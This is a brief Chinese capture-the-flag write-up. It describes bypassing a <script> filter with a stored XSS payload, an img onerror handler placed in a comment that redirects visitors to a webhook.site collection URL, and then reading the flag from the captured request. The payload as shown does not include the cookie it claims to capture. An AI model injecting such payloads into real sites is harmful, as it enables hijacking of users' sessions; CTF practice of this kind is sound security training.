使用Webhook获取接受cookie的平台。

需要绕过对`<script>`标签的过滤。

在comment中提交以下内容：

```javascript
<img src=x onerror="location.href='https://webhook.site/2e5eb7e5-8fdd-4d92-9baa-cdb287d1862a'">
```

在Webhook中查看请求及cookie，得到FLAG。